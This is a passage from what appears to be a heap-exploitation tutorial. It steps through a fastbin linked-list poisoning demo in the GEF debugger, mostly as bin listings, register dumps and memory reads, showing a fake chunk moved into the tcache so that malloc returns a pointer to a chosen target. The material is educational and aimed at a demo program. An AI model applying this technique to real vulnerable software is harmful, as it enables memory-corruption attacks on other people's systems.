Tcachebins[idx=4, size=0x60, count=7] ←  Chunk(addr=0x5555555598f0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559890, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559830, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555597d0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559770, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559710, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555596b0, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60]  ←  Chunk(addr=0x555555559a10, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555558010, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/10g 0x555555559a10
0x555555559a10: 0x55500000d559  0x0
0x555555559a20: 0x0 0x0
0x555555559a30: 0x0 0x0
0x555555559a40: 0x0 0x0
0x555555559a50: 0x0 0x0
gef➤  x/10g 0x555555559a00
0x555555559a00: 0x0 0x61
0x555555559a10: 0x55500000d559  0x0
0x555555559a20: 0x0 0x0
0x555555559a30: 0x0 0x0
0x555555559a40: 0x0 0x0
gef➤  x/10g 0x555555558000
0x555555558000: 0x0 0x61
0x555555558010 <target>:    0x555555558 0x0
0x555555558020: 0x0 0x0
0x555555558030: 0x0 0x0
0x555555558040: 0x0 0x0
gef➤  
```

So, we can see the two next ptrs we wrote at `0x555555559a10` and `0x555555558010`. This is reflected, with that we see that there are only two chunks in the fastbin. Now let's go ahead and empty the tcache for the size that corresponds to our fastbin idx, so we can allocate a chunk from it:

```
gef➤  c
Continuing.

Breakpoint 3, 0x0000555555555514 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6             
$rbx   : 0x0             
$rcx   : 0x0             
$rdx   : 0x00005555555596b0  →  0x0000000555555559
$rsp   : 0x00007fffffffdf40  →  0x000000070000000d ("\r"?)
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x50            
$rip   : 0x0000555555555514  →  <main+843> call 0x5555555550d0 <malloc@plt>
$r8 : 0x0            
$r9 : 0x00007fffffffde0f  →  "555555558"
$r10   : 0x0             
$r11   : 0x246           
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3d7  →  "/Hackery/shogun/pwn_demos/fastbin/fastbin[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf40│+0x0000: 0x000000070000000d ("\r"?)   ← $rsp
0x00007fffffffdf48│+0x0008: 0x0000555555559950  →  0x0000000555555559
0x00007fffffffdf50│+0x0010: 0x00005555555599b0  →  0x000055500000cc19
0x00007fffffffdf58│+0x0018: 0x0000555555559a10  →  0x000055500000d559
0x00007fffffffdf60│+0x0020: 0x000055500000d559
0x00007fffffffdf68│+0x0028: 0x0000000555555558
0x00007fffffffdf70│+0x0030: 0x00000000000006f0
0x00007fffffffdf78│+0x0038: 0x00007fffffffe3b9  →  0x592181489ad07b3e
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555509 <main+832>    cmp DWORD PTR [rbp-0x7c], 0x6
   0x55555555550d <main+836>    jle 0x5555555554ee <main+805>
   0x55555555550f <main+838>    mov edi, 0x50
 → 0x555555555514 <main+843>    call   0x5555555550d0 <malloc@plt>
   ↳  0x5555555550d0 <malloc@plt+0>   endbr64
    0x5555555550d4 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2ef5]      # 0x555555557fd0 <malloc@got.plt>
    0x5555555550db <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550e0 <_start+0>       endbr64
    0x5555555550e4 <_start+4>       xor ebp, ebp
    0x5555555550e6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000050,
   $rsi = 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fastbin_linked", stopped 0x555555555514 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555514 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60]  ←  Chunk(addr=0x555555559a10, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555558010, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see that the tcache bin for our fastbin size is empty. So we are ready to allocate a chunk from the fastbin. Remember, after we allocate a chunk from the fastbin, it will try to move over as many chunks as it can from that fastbin to the corresponding tcache. Since there is only one chunk left in the fastbin (our fake chunk), that will get moved over to the tcache:

```
gef➤  c
Continuing.

Breakpoint 4, 0x0000555555555519 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559a10  →  0x000055500000d559
$rbx   : 0x0             
$rcx   : 0x00007ffff7e19cb0  →  0x0000000000000000
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf40  →  0x000000070000000d ("\r"?)
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x00007ffff7e19ca0  →  0x0000000000000000
$rip   : 0x0000555555555519  →  <main+848> mov QWORD PTR [rbp-0x50], rax
$r8 : 0x0000555555559010  →  0x0000000000000000
$r9 : 0x0000555555559a10  →  0x000055500000d559
$r10   : 0x0000555555558010  →  <target+0> pop rax
$r11   : 0x4             
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3d7  →  "/Hackery/shogun/pwn_demos/fastbin/fastbin[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf40│+0x0000: 0x000000070000000d ("\r"?)   ← $rsp
0x00007fffffffdf48│+0x0008: 0x0000555555559950  →  0x0000000555555559
0x00007fffffffdf50│+0x0010: 0x00005555555599b0  →  0x000055500000cc19
0x00007fffffffdf58│+0x0018: 0x0000555555559a10  →  0x000055500000d559
0x00007fffffffdf60│+0x0020: 0x000055500000d559
0x00007fffffffdf68│+0x0028: 0x0000000555555558
0x00007fffffffdf70│+0x0030: 0x00000000000006f0
0x00007fffffffdf78│+0x0038: 0x00007fffffffe3b9  →  0x592181489ad07b3e
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555550d <main+836>    jle 0x5555555554ee <main+805>
   0x55555555550f <main+838>    mov edi, 0x50
   0x555555555514 <main+843>    call   0x5555555550d0 <malloc@plt>
 → 0x555555555519 <main+848>    mov QWORD PTR [rbp-0x50], rax
   0x55555555551d <main+852>    mov edi, 0x50
   0x555555555522 <main+857>    call   0x5555555550d0 <malloc@plt>
   0x555555555527 <main+862>    mov QWORD PTR [rbp-0x48], rax
   0x55555555552b <main+866>    mov rax, QWORD PTR [rbp-0x48]
   0x55555555552f <main+870>    mov rsi, rax
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fastbin_linked", stopped 0x555555555519 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555519 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/g $rax
0x555555559a10: 0x55500000d559
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=4, size=0x60, count=1] ←  Chunk(addr=0x555555558010, size=0x60, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see that the tcache bin has our fake chunk. Then, we can just allocate that, and get a malloc to return a ptr to `target`:

```
gef➤  c
Continuing.

Breakpoint 5, 0x0000555555555527 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555558010  →  <target+0> pop rax
$rbx   : 0x0             
$rcx   : 0x0             
$rdx   : 0x0000555555559010  →  0x0000000000000000
$rsp   : 0x00007fffffffdf40  →  0x000000070000000d ("\r"?)
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x14            
$rip   : 0x0000555555555527  →  <main+862> mov QWORD PTR [rbp-0x48], rax
$r8 : 0x0000555555559010  →  0x0000000000000000
$r9 : 0x0000555555559a10  →  0x000055500000d559
$r10   : 0x0000555555558010  →  <target+0> pop rax
$r11   : 0x4             
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3d7  →  "/Hackery/shogun/pwn_demos/fastbin/fastbin[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf40│+0x0000: 0x000000070000000d ("\r"?)   ← $rsp
0x00007fffffffdf48│+0x0008: 0x0000555555559950  →  0x0000000555555559
0x00007fffffffdf50│+0x0010: 0x00005555555599b0  →  0x000055500000cc19
0x00007fffffffdf58│+0x0018: 0x0000555555559a10  →  0x000055500000d559
0x00007fffffffdf60│+0x0020: 0x000055500000d559
0x00007fffffffdf68│+0x0028: 0x0000000555555558
0x00007fffffffdf70│+0x0030: 0x0000555555559a10  →  0x000055500000d559
0x00007fffffffdf78│+0x0038: 0x00007fffffffe3b9  →  0x592181489ad07b3e
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555519 <main+848>    mov QWORD PTR [rbp-0x50], rax
   0x55555555551d <main+852>    mov edi, 0x50
   0x555555555522 <main+857>    call   0x5555555550d0 <malloc@plt>
 → 0x555555555527 <main+862>    mov QWORD PTR [rbp-0x48], rax
   0x55555555552b <main+866>    mov rax, QWORD PTR [rbp-0x48]
   0x55555555552f <main+870>    mov rsi, rax
   0x555555555532 <main+873>    lea rax, [rip+0x1323]       # 0x55555555685c
   0x555555555539 <main+880>    mov rdi, rax
   0x55555555553c <main+883>    mov eax, 0x0
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "fastbin_linked", stopped 0x555555555527 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555527 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/10g $rax
0x555555558010 <target>:    0x555555558 0x0
0x555555558020: 0x0 0x0
0x555555558030: 0x0 0x0
0x555555558040: 0x0 0x0
0x555555558050: 0x0 0x0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  c
Continuing.
Reallocated Ptr:    0x555555558010
Did we get target?  True
[Inferior 1 (process 9460) exited normally]
```

Just like that, we were able to leverage the fastbin, to get malloc to allocate a ptr to `target`.
